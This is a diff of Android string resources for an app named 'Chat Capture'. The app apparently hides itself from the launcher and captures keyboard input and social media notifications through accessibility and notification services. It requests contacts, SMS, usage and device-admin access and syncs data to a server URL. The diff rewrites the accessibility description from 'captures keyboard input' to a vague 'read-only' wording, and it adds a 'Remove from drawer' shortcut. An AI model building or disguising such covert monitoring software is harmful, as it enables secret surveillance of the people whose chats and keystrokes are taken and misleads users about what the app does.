@@ -4,7 +4,7 @@
     <string name="permission_setup_title">Setting Up Chat Capture</string>
     <string name="permission_setup_message">Please grant the required permissions to enable chat and notification capture.</string>
     <string name="app_hidden_message">App is hidden from launcher. Access via Settings → Apps → Chat Capture</string>
-    <string name="accessibility_service_description">This service captures keyboard input for chat monitoring purposes.</string>
+    <string name="accessibility_service_description">This service monitors UI events for chat capture. It is read-only and does not interfere with or affect other apps. It only monitors specific social media apps and does not block or modify any user interactions.</string>
     <string name="notification_service_description">This service captures notifications from social media apps.</string>
     
     <!-- Permissions -->
@@ -31,6 +31,32 @@
     <string name="settings_server_url">Server URL</string>
     <string name="settings_target_apps">Target Apps</string>
     <string name="settings_sync_interval">Sync Interval</string>
+
+    <!-- Shortcut labels -->
+    <string name="shortcut_hide_short">Remove from drawer</string>
+    <string name="shortcut_hide_long">Remove this app from the app drawer</string>
+    <string name="shortcut_permissions_short">Permissions</string>
+    <string name="shortcut_permissions_long">Permission settings</string>
+
+    <!-- Permission settings screen -->
+    <string name="permission_settings_title">Permission Settings</string>
+    <string name="permission_settings_subtitle">Review and open system settings for required permissions.</string>
+    <string name="permission_status_checking">Checking status...</string>
+    <string name="permission_status_granted">Granted</string>
+    <string name="permission_status_denied">Denied</string>
+    <string name="permission_status_not_applicable">Not applicable</string>
+    <string name="permission_open_app_settings">Open App Permissions</string>
+    <string name="permission_open_notification_settings">Open Notification Access</string>
+    <string name="permission_open_accessibility_settings">Open Accessibility Settings</string>
+    <string name="permission_open_usage_settings">Open Usage Access</string>
+    <string name="permission_open_battery_settings">Open Battery Optimization Settings</string>
+    <string name="permission_open_device_admin_settings">Open Device Admin Settings</string>
+    <string name="permission_runtime_status">Runtime: Contacts %1$s | SMS %2$s | Media %3$s | Notifications %4$s</string>
+    <string name="permission_notification_status">Notification Listener: %1$s</string>
+    <string name="permission_accessibility_status">Accessibility: Keyboard %1$s | Enhanced %2$s</string>
+    <string name="permission_usage_status">Usage Access: %1$s</string>
+    <string name="permission_battery_status">Ignore Battery Optimizations: %1$s</string>
+    <string name="permission_device_admin_status">Device Admin: %1$s</string>
     
     <!-- Arrays -->
     <string-array name="sync_interval_entries">
